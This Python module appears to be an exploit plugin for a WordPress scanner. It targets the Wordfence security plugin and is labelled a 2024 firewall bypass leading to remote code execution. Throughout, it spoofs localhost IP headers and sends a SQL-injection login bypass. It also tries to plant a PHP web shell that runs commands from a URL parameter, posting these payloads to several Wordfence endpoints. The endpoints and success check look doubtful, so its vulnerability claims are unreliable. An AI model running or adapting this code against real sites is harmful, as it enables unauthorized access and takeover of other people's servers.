import requests
from core.printmodels import *
import json

class Wordfence_Firewall_Bypass:
    def __init__(self):
        self.name = "Wordfence Firewall Bypass"
        self.description = "Wordfence Security Plugin Firewall Bypass to RCE (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'X-Forwarded-For': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1'
            }

            payloads = [
                {
                    "action": "wordfence_ls_authenticate",
                    "wp_user": "admin' OR '1'='1",
                    "wp_pass": "DrDataYE",
                    "remember": True
                },
                {
                    "action": "wordfence_importSettings",
                    "importSettings": {
                        "allowHTTPSURLs": True,
                        "scan_include_extra": "<?php system($_GET['cmd']); ?>"
                    }
                }
            ]

            endpoints = [
                f"{site}/wp-admin/admin-ajax.php",
                f"{site}/wp-json/wordfence/v1/authenticate",
                f"{site}/wp-content/plugins/wordfence/modules/login-security/init.php"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('success' in response.text or 'authenticated' in response.text):
                        return PrintSuccess(f"[Wordfence-2024] Vulnerable! Firewall bypass successful at {endpoint}")

            return PrintFailed("[Wordfence-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Wordfence-2024] Error: {str(e)}")
